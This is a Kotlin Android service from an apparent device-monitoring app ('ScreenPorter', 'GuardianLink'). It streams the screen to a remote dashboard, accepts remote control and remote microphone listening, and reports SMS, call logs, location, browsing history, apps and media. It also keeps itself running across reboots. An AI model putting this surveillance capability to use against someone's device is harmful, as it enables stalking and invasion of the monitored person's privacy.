package com.screenporter.companion

import android.app.Activity
import android.app.Notification
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentSender
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.SurfaceTexture
import android.hardware.display.DisplayManager
import android.media.Image
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.hardware.display.VirtualDisplay
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.view.Surface
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.screenporter.companion.capture.AudioCapturer
import com.screenporter.companion.capture.VideoEncoder
import com.screenporter.companion.location.LocationReporter
import com.screenporter.companion.monitoring.AlertDetector
import com.screenporter.companion.monitoring.AppUsageReporter
import com.screenporter.companion.monitoring.BrowserHistoryReporter
import com.screenporter.companion.monitoring.CallLogReporter
import com.screenporter.companion.monitoring.InstalledAppsReporter
import com.screenporter.companion.monitoring.SmsReporter
import com.screenporter.companion.monitoring.MediaReporter
import com.screenporter.companion.network.ApiClient
import com.screenporter.companion.network.WsMessage
import com.screenporter.companion.network.WebSocketClient
import com.screenporter.companion.util.PreferencesManager
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Foreground service that handles capture (VÍDEO or ECRÃ), network (WebSocket),
 * control dispatch (via AccessibilityService), and optional location reporting.
 *
 * Three capture modes (priority order):
 *  1. VÍDEO     - MediaProjection → Surface → MediaCodec H.264 (best image, fluid)
 *  2. ECRÃ      - takeScreenshot via Accessibility (Android 11+) → encode ~1/s
 *                Survives reboot without re-prompting for video permission.
 *  3. CONTROLO  - no capture; only relay control commands and stay connected.
 *
 * Mode selection rule:
 *  - If we have a video projection token → VÍDEO
 *  - Else if Accessibility service is enabled (Android 11+) → ECRÃ
 *  - Else → CONTROLO
 *  If video permission is revoked mid-session, fall back to ECRÃ without dying.
 */
class CaptureService : Service() {

    companion object {
        const val TAG = "SP-Capture"
        const val NOTIF_ID = 1001
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val ACTION_START = "com.screenporter.companion.START"
        const val ACTION_STOP = "com.screenporter.companion.STOP"
        const val ACTION_REEVALUATE = "com.screenporter.companion.REEVALUATE"

        @Volatile
        var instance: CaptureService? = null
            private set

        @Volatile
        var currentMode: CaptureMode = CaptureMode.NONE
            private set
    }

    enum class CaptureMode { NONE, VIDEO, SCREEN, CONTROL }

    // Apanha QUALQUER exceção não-tratada das corrotinas do serviço. Sem isto,
    // um erro num reporter/arranque propaga-se e o Android mata o processo —
    // cortando o WebSocket de vídeo (code 1006, 0 frames). (robustez do totalcontrol)
    private val scope = CoroutineScope(
        SupervisorJob() + Dispatchers.IO + CoroutineExceptionHandler { _, e ->
            Log.e(TAG, "corrotina falhou (ignorado, nao derruba o processo)", e)
        }
    )
    private lateinit var prefs: PreferencesManager
    private lateinit var api: ApiClient
    private lateinit var ws: WebSocketClient
    private var locationReporter: LocationReporter? = null
    private var callLogReporter: CallLogReporter? = null
    private var smsReporter: SmsReporter? = null
    private var appUsageReporter: AppUsageReporter? = null
    private var browserHistoryReporter: BrowserHistoryReporter? = null
    private var installedAppsReporter: InstalledAppsReporter? = null
    private val alertDetector = AlertDetector()

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var surfaceTexture: SurfaceTexture? = null
    private var encoderSurface: Surface? = null
    private var videoEncoder: VideoEncoder? = null
    private var wakeLock: PowerManager.WakeLock? = null

    // Escuta remota (áudio do dispositivo → dashboard).
    private var audioCapturer: AudioCapturer? = null
    @Volatile private var micFgsActive = false

    // Modo ECRÃ: screenshot → YUV → MediaCodec H.264 (portado do totalcontrol)
    private var screenEncoder: MediaCodec? = null
    @Volatile private var screenRunning = false
    private var screenPts = 0L

    private var mediaReporter: MediaReporter? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        prefs = (application as ScreenPorterApp).prefs
        api = ApiClient(prefs)
        ws = WebSocketClient(prefs)
        ws.listener = object : WebSocketClient.Listener {
            override fun onConnect() {
                Log.i(TAG, "WS connected")
                updateNotification(currentMode, true)
            }
            override fun onDisconnect(reason: String) {
                Log.w(TAG, "WS disconnected: $reason")
                updateNotification(currentMode, false)
            }
            override fun onControl(message: WsMessage.Control) {
                when (message.command) {
                    "audio_start" -> startAudioCapture(message.source ?: "playback")
                    "audio_stop" -> stopAudioCapture()
                    else -> ControlAccessibilityService.instance?.handleControl(message)
                }
            }
            override fun onText(message: String) {
                Log.d(TAG, "WS text: $message")
            }
        }
        // Cache screen dimensions
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = android.util.DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)
        WebSocketClient.screenWidth = metrics.widthPixels
        WebSocketClient.screenHeight = metrics.heightPixels
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopCapture()
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_REEVALUATE -> {
                // Vídeo revogado (MediaProjection parou) — desce para ECRÃ ou CONTROLO
                // sem reiniciar o WebSocket nem os reporters. (igual ao totalcontrol)
                stopVideoMode()
                stopScreenMode()
                val canUseScreen = com.screenporter.companion.util.PermissionState.isAccessibilityEnabled(this) &&
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
                if (canUseScreen) {
                    startScreenMode()
                } else {
                    startControlMode()
                }
                startForegroundWithNotification(false)
                updateNotification(currentMode, prefs.isConnected)
            }
            ACTION_START, null -> {
                val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
                val resultData: Intent? = intent?.getParcelableExtra(EXTRA_RESULT_DATA)
                // Só pedimos o tipo mediaProjection ao arrancar em primeiro plano
                // SE houver mesmo autorização de vídeo agora. Num reinício do
                // serviço (intent nulo) não há — e pedir mediaProjection sem a
                // projeção ativa rebenta no Android 14+ (SecurityException), o que
                // matava o serviço e o tornava não-persistente.
                val hasVideo = resultCode == Activity.RESULT_OK && resultData != null
                startForegroundWithNotification(hasVideo)
                acquireWakeLock()
                startCapture(resultCode, resultData)
            }
        }
        return START_STICKY
    }

    /**
     * Decide capture mode based on what permissions are available.
     */
    private fun startCapture(resultCode: Int?, resultData: Intent?) {
        scope.launch {
            // Login first if no token
            if (prefs.authToken.isNullOrEmpty()) {
                val ok = api.login()
                if (!ok) {
                    Log.e(TAG, "Login failed — check server/credentials")
                    return@launch
                }
            }

            // Choose mode
            val canUseVideo = resultCode != null && resultCode == Activity.RESULT_OK && resultData != null
            val canUseScreen = com.screenporter.companion.util.PermissionState.isAccessibilityEnabled(this@CaptureService) &&
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.R

            when {
                canUseVideo -> startVideoMode(resultCode!!, resultData!!)
                canUseScreen -> startScreenMode()
                else -> startControlMode()
            }

            // Start WebSocket
            ws.start()

            // Optional location (GuardianLink — GPS)
            if (com.screenporter.companion.util.PermissionState.isLocationGranted(this@CaptureService)) {
                locationReporter = LocationReporter(this@CaptureService, prefs, api)
                locationReporter?.start()
            }

            // Optional call log (GuardianLink — calls)
            if (com.screenporter.companion.util.PermissionState.isCallLogGranted(this@CaptureService)) {
                callLogReporter = CallLogReporter(this@CaptureService, prefs, api)
                callLogReporter?.start()
            }

            // Optional SMS (GuardianLink — SMS + alerts)
            if (com.screenporter.companion.util.PermissionState.isSmsGranted(this@CaptureService)) {
                smsReporter = SmsReporter(this@CaptureService, prefs, api, alertDetector)
                smsReporter?.start()
            }

            // Optional app usage (GuardianLink — screen time)
            if (com.screenporter.companion.util.PermissionState.isUsageStatsGranted(this@CaptureService)) {
                appUsageReporter = AppUsageReporter(this@CaptureService, prefs, api)
                appUsageReporter?.start()
            }

            // Optional browser history (GuardianLink — browsing)
            if (com.screenporter.companion.util.PermissionState.isBrowserHistoryGranted(this@CaptureService)) {
                browserHistoryReporter = BrowserHistoryReporter(this@CaptureService, prefs, api, alertDetector)
                browserHistoryReporter?.start()
            }

            // Lista de apps instaladas (não requer permissão especial — QUERY_ALL_PACKAGES)
            installedAppsReporter = InstalledAppsReporter(this@CaptureService, prefs, api)
            installedAppsReporter?.start()

            // Media (fotos, vídeos, áudios do MediaStore)
            mediaReporter = MediaReporter(this@CaptureService, prefs)
            mediaReporter?.start()

            prefs.isConnected = true
            prefs.hasVideoAuth = canUseVideo
            updateNotification(currentMode, true)
        }
    }

    /**
     * VÍDEO mode: MediaProjection → Surface → MediaCodec H.264.
     */
    private fun startVideoMode(resultCode: Int, data: Intent) {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val proj = mpm.getMediaProjection(resultCode, data)

            // CRÍTICO (Android 14+): o callback do MediaProjection TEM de ser
            // registado ANTES de createVirtualDisplay, senão este lança
            // IllegalStateException ("Must register a callback before starting
            // capture") — era isto que caía no catch e ia para ECRÃ = 0 frames.
            // Usamos o Looper principal porque isto corre numa coroutine IO.
            // (igual ao totalcontrol)
            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.w(TAG, "MediaProjection stopped — requesting mode re-evaluation")
                    try {
                        startService(Intent(this@CaptureService, CaptureService::class.java).apply {
                            action = ACTION_REEVALUATE
                        })
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to request re-evaluation", e)
                    }
                }
            }, Handler(Looper.getMainLooper()))

            // Reduz o lado maior para ~900 px (banda do relay Tailscale/dados).
            val (w, h) = scaledVideoSize(WebSocketClient.screenWidth, WebSocketClient.screenHeight)
            // A app reporta no 'hello' o tamanho do VÍDEO; o controlo é
            // normalizado (0..1), por isso continua certo.
            WebSocketClient.screenWidth = w
            WebSocketClient.screenHeight = h
            // O codificador cria a SUA superfície de entrada; é ESSA que o
            // VirtualDisplay alimenta (espelha o ecrã real para dentro do codec).
            videoEncoder = VideoEncoder(w, h) { frame ->
                ws.sendBinaryFrame(frame.payload, frame.isKeyframe, frame.isConfig, frame.timestampUs)
            }
            val encoderSurface = videoEncoder!!.start()

            val virtualDisplay = proj.createVirtualDisplay(
                "ScreenPorter", w, h, resources.displayMetrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, encoderSurface, null, null
            )
            this.projection = proj
            this.virtualDisplay = virtualDisplay
            this.encoderSurface = encoderSurface

            currentMode = CaptureMode.VIDEO
            Log.i(TAG, "Started in VÍDEO mode (${w}x${h})")
        } catch (e: Exception) {
            Log.e(TAG, "VÍDEO mode failed, falling back", e)
            stopVideoMode()
            startScreenMode()
        }
    }

    /**
     * ECRÃ mode: takeScreenshot via AccessibilityService → Bitmap → YUV → MediaCodec
     * → H.264 Annex-B → WebSocket. ~1 imagem/seg, mas sobrevive a reinícios sem
     * autorização de vídeo nova. (portado do totalcontrol)
     */
    private fun startScreenMode() {
        currentMode = CaptureMode.SCREEN
        Log.i(TAG, "Started in ECRÃ mode (screenshot-based)")

        val (w, h) = scaledVideoSize(
            resources.displayMetrics.widthPixels,
            resources.displayMetrics.heightPixels
        )

        val format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, w, h).apply {
            setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible)
            setInteger(MediaFormat.KEY_BIT_RATE, 800_000)
            setInteger(MediaFormat.KEY_FRAME_RATE, 2)
            setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2)
            setInteger(MediaFormat.KEY_BITRATE_MODE, MediaCodecInfo.EncoderCapabilities.BITRATE_MODE_VBR)
        }

        val codec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
        codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        codec.start()
        screenEncoder = codec
        screenRunning = true
        screenPts = 0L

        Thread({ drainScreenEncoder(codec) }, "sp-screen-drain").apply { isDaemon = true }.start()

        scope.launch {
            while (screenRunning && currentMode == CaptureMode.SCREEN) {
                val inicio = System.currentTimeMillis()
                val bmp = capturarUmaImagem()
                if (bmp != null) {
                    try { feedScreenEncoder(bmp, w, h) } catch (_: Exception) {}
                    bmp.recycle()
                }
                val espera = 1000 - (System.currentTimeMillis() - inicio)
                if (espera > 0) kotlinx.coroutines.delay(espera)
            }
        }
    }

    private fun capturarUmaImagem(): Bitmap? {
        val svc = ControlAccessibilityService.instance ?: return null
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null
        var resultado: Bitmap? = null
        val latch = CountDownLatch(1)
        svc.takeScreenshot { bmp -> resultado = bmp; latch.countDown() }
        try { latch.await(2, TimeUnit.SECONDS) } catch (_: InterruptedException) {}
        return resultado
    }

    private fun feedScreenEncoder(bitmap: Bitmap, w: Int, h: Int) {
        val codec = screenEncoder ?: return
        val idx = codec.dequeueInputBuffer(100_000)
        if (idx < 0) return
        val image = codec.getInputImage(idx) ?: run {
            codec.queueInputBuffer(idx, 0, 0, 0, 0); return
        }
        val escalado = Bitmap.createScaledBitmap(bitmap, image.width, image.height, true)
        preencherYuv(image, escalado)
        if (escalado !== bitmap) escalado.recycle()
        screenPts += 500_000
        codec.queueInputBuffer(idx, 0, image.width * image.height * 3 / 2, screenPts, 0)
    }

    private fun preencherYuv(image: Image, bitmap: Bitmap) {
        val w = image.width
        val h = image.height
        val argb = IntArray(w * h)
        bitmap.getPixels(argb, 0, w, 0, 0, w, h)
        val yP = image.planes[0]; val uP = image.planes[1]; val vP = image.planes[2]
        val yB = yP.buffer; val uB = uP.buffer; val vB = vP.buffer
        for (j in 0 until h) {
            for (i in 0 until w) {
                val p = argb[j * w + i]
                val r = (p shr 16) and 0xff; val g = (p shr 8) and 0xff; val b = p and 0xff
                val y = ((66 * r + 129 * g + 25 * b + 128) shr 8) + 16
                yB.put(j * yP.rowStride + i * yP.pixelStride, y.coerceIn(0, 255).toByte())
                if (j % 2 == 0 && i % 2 == 0) {
                    val u = ((-38 * r - 74 * g + 112 * b + 128) shr 8) + 128
                    val v = ((112 * r - 94 * g - 18 * b + 128) shr 8) + 128
                    val lin = j / 2; val col = i / 2
                    uB.put(lin * uP.rowStride + col * uP.pixelStride, u.coerceIn(0, 255).toByte())
                    vB.put(lin * vP.rowStride + col * vP.pixelStride, v.coerceIn(0, 255).toByte())
                }
            }
        }
    }

    private fun drainScreenEncoder(codec: MediaCodec) {
        val info = MediaCodec.BufferInfo()
        var frameCount = 0
        var configCache: ByteArray? = null
        try {
            while (screenRunning) {
                val idx = try {
                    codec.dequeueOutputBuffer(info, 100_000)
                } catch (e: Exception) {
                    Log.e(TAG, "screen drain dequeue failed after $frameCount frames", e)
                    break
                }
                when {
                    idx == MediaCodec.INFO_TRY_AGAIN_LATER -> continue
                    idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED -> continue
                    idx >= 0 -> {
                        try {
                            val buf = codec.getOutputBuffer(idx)
                            if (buf != null && info.size > 0) {
                                val data = ByteArray(info.size)
                                buf.position(info.offset)
                                buf.get(data, 0, info.size)

                                val isConfig = info.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG != 0
                                var isKey = info.flags and MediaCodec.BUFFER_FLAG_KEY_FRAME != 0
                                if (!isConfig && !isKey && contemIdr(data)) isKey = true

                                if (isConfig) configCache = data.copyOf()

                                val payload = if (isKey && !isConfig && configCache != null) {
                                    ByteArray(configCache!!.size + data.size).also {
                                        System.arraycopy(configCache!!, 0, it, 0, configCache!!.size)
                                        System.arraycopy(data, 0, it, configCache!!.size, data.size)
                                    }
                                } else data

                                ws.sendBinaryFrame(payload, isKey, isConfig, info.presentationTimeUs)
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "screen frame #$frameCount failed", e)
                        }
                        frameCount++
                        try { codec.releaseOutputBuffer(idx, false) } catch (_: Exception) {}
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "screen drain died after $frameCount frames", e)
        }
        Log.w(TAG, "screen drain stopped — total frames: $frameCount")
    }

    private fun contemIdr(dados: ByteArray): Boolean {
        var i = 0
        val n = dados.size
        while (i + 3 < n) {
            if (dados[i].toInt() == 0 && dados[i + 1].toInt() == 0) {
                var j = i + 2
                if (j < n && dados[j].toInt() == 0) j++
                if (j < n && dados[j].toInt() == 1 && j + 1 < n) {
                    val nalType = dados[j + 1].toInt() and 0x1F
                    if (nalType == 5) return true
                    i = j + 2
                    continue
                }
            }
            i++
        }
        return false
    }

    private fun stopScreenMode() {
        screenRunning = false
        try { screenEncoder?.stop(); screenEncoder?.release() } catch (_: Exception) {}
        screenEncoder = null
    }

    /**
     * CONTROLO mode: no capture; just relay control commands and stay connected.
     */
    private fun startControlMode() {
        currentMode = CaptureMode.CONTROL
        Log.i(TAG, "Started in CONTROLO mode (no capture)")
    }

    /**
     * WakeLock: mantém o ecrã ligado (dimmed) para o MediaProjection não capturar
     * preto. SCREEN_DIM_WAKE_LOCK é necessário para espelhamento — sem ele o ecrã
     * desliga após o timeout e todo o vídeo fica preto. ACQUIRE_CAUSES_WAKEUP
     * acende o ecrã se já estiver desligado. Para ser persistente é preciso TAMBÉM
     * isentar a app da otimização de bateria.
     */
    @Suppress("DEPRECATION")
    private fun acquireWakeLock() {
        try {
            if (wakeLock?.isHeld == true) return
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.SCREEN_DIM_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "ScreenPorter::captura"
            ).apply {
                setReferenceCounted(false)
                acquire()
            }
            Log.i(TAG, "WakeLock (screen-dim) adquirido")
        } catch (e: Exception) {
            Log.w(TAG, "Falha a adquirir WakeLock", e)
        }
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
        wakeLock = null
    }

    // --- Escuta remota (áudio do dispositivo → dashboard) -------------------

    private fun startAudioCapture(sourceStr: String) {
        stopAudioCapture()
        val useMic = sourceStr == "mic"
        val src = if (useMic) AudioCapturer.Source.MIC else AudioCapturer.Source.PLAYBACK
        if (useMic) {
            if (!com.screenporter.companion.util.PermissionState.isMicGranted(this)) {
                ws.sendText("""{"t":"audio_error","message":"Microfone sem permissão no dispositivo"}""")
                return
            }
            ensureMicForegroundType(true)
        }
        val cap = AudioCapturer(
            source = src,
            projection = projection,
            onPcm = { pcm -> ws.sendAudioFrame(pcm) },
            onError = { m -> ws.sendText("""{"t":"audio_error","message":"${jsonEsc(m)}"}""") }
        )
        audioCapturer = cap
        val ok = cap.start()
        if (ok) {
            ws.sendText(
                """{"t":"audio_meta","active":true,"sampleRate":${cap.sampleRate},"channels":${cap.channels},"source":"${if (useMic) "mic" else "playback"}"}"""
            )
            Log.i(TAG, "Escuta iniciada ($sourceStr)")
        } else {
            audioCapturer = null
            if (useMic) ensureMicForegroundType(false)
        }
    }

    private fun stopAudioCapture() {
        val cap = audioCapturer
        audioCapturer = null
        cap?.stop()
        if (micFgsActive) ensureMicForegroundType(false)
        if (cap != null) {
            try { ws.sendText("""{"t":"audio_meta","active":false}""") } catch (_: Exception) {}
            Log.i(TAG, "Escuta parada")
        }
    }

    /**
     * Android 14+ exige que o tipo 'microphone' esteja ativo no serviço em
     * primeiro plano para captar o microfone. Reafirma o startForeground com (ou
     * sem) esse tipo, conforme a escuta por microfone começa/termina.
     */
    private fun ensureMicForegroundType(enable: Boolean) {
        if (Build.VERSION.SDK_INT < 34) { micFgsActive = enable; return }
        if (enable == micFgsActive) return
        try {
            val notif = buildNotification(currentMode, prefs.isConnected)
            var tipo = if (prefs.hasVideoAuth && currentMode == CaptureMode.VIDEO)
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            else ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            if (com.screenporter.companion.util.PermissionState.isLocationGranted(this)) {
                tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (enable) tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            startForeground(NOTIF_ID, notif, tipo)
            micFgsActive = enable
        } catch (e: Exception) {
            Log.e(TAG, "ensureMicForegroundType($enable) falhou", e)
        }
    }

    private fun jsonEsc(s: String): String =
        s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ").replace("\r", " ")

    /**
     * Reduz o lado maior para ~900 px, preservando a proporção e alinhando as
     * dimensões a 16 px (macroblock boundary). Chipsets MediaTek (Helio) podem
     * crashar silenciosamente com dimensões não-alinhadas. (igual ao totalcontrol)
     */
    private fun scaledVideoSize(w: Int, h: Int): Pair<Int, Int> {
        if (w <= 0 || h <= 0) return Pair(720, 1600)
        val maior = maxOf(w, h)
        val escala = if (maior > 900) 900.0 / maior else 1.0
        fun align16(v: Int) = ((v + 8) / 16 * 16).coerceAtLeast(16)
        return Pair(align16((w * escala).toInt()), align16((h * escala).toInt()))
    }

    private fun stopVideoMode() {
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { videoEncoder?.stop() } catch (_: Exception) {}
        try { encoderSurface?.release() } catch (_: Exception) {}
        try { surfaceTexture?.release() } catch (_: Exception) {}
        try { projection?.stop() } catch (_: Exception) {}
        virtualDisplay = null
        videoEncoder = null
        encoderSurface = null
        surfaceTexture = null
        projection = null
    }

    private fun stopCapture() {
        stopAudioCapture()
        stopVideoMode()
        stopScreenMode()
        ws.stop()
        locationReporter?.stop()
        locationReporter = null
        callLogReporter?.stop()
        callLogReporter = null
        smsReporter?.stop()
        smsReporter = null
        appUsageReporter?.stop()
        appUsageReporter = null
        browserHistoryReporter?.stop()
        browserHistoryReporter = null
        installedAppsReporter?.stop()
        installedAppsReporter = null
        mediaReporter?.stop()
        mediaReporter = null
        releaseWakeLock()
        currentMode = CaptureMode.NONE
        prefs.isConnected = false
    }

    override fun onDestroy() {
        stopCapture()
        instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // --- Notification management ---

    private fun startForegroundWithNotification(hasVideo: Boolean) {
        ControlAccessibilityService.ensureChannel(this)
        val notif = buildNotification(currentMode, prefs.isConnected)
        // Android 14+ (API 34): o tipo TEM de ser explícito e só o que é válido
        // AGORA. mediaProjection exige a projeção ativa (autorização de vídeo);
        // sem ela usamos specialUse. (igual ao totalcontrol)
        if (Build.VERSION.SDK_INT >= 34) {
            var tipo = if (hasVideo) ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                       else ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            if (com.screenporter.companion.util.PermissionState.isLocationGranted(this)) {
                tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            try {
                startForeground(NOTIF_ID, notif, tipo)
            } catch (e: Exception) {
                // Se mediaProjection falhar (appop ainda não pronto), não morre:
                // arranca como specialUse para o serviço continuar vivo (controlo).
                Log.e(TAG, "startForeground(tipo=$tipo) falhou — a usar specialUse", e)
                var fb = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                if (com.screenporter.companion.util.PermissionState.isLocationGranted(this)) {
                    fb = fb or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                }
                try { startForeground(NOTIF_ID, notif, fb) } catch (_: Exception) {}
            }
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    private fun updateNotification(mode: CaptureMode, connected: Boolean) {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(NOTIF_ID, buildNotification(mode, connected))
    }

    private fun buildNotification(mode: CaptureMode, connected: Boolean): Notification {
        val launchIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pi = PendingIntent.getActivity(
            this, 0, launchIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val modeText = when (mode) {
            CaptureMode.VIDEO -> getString(R.string.mode_video)
            CaptureMode.SCREEN -> getString(R.string.mode_screen)
            CaptureMode.CONTROL -> getString(R.string.mode_control)
            CaptureMode.NONE -> getString(R.string.status_disconnected)
        }

        val title = if (connected) getString(R.string.notification_title) else getString(R.string.status_disconnected)
        val text = if (!connected) getString(R.string.status_disconnected)
                   else if (locationReporter != null) getString(R.string.notification_text_location)
                   else if (mode == CaptureMode.SCREEN || mode == CaptureMode.VIDEO) getString(R.string.notification_text)
                   else getString(R.string.notification_text_no_capture)

        return NotificationCompat.Builder(this, ControlAccessibilityService.CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle(title)
            .setContentText(text)
            .setSubText(modeText)
            .setOngoing(true)
            .setContentIntent(pi)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
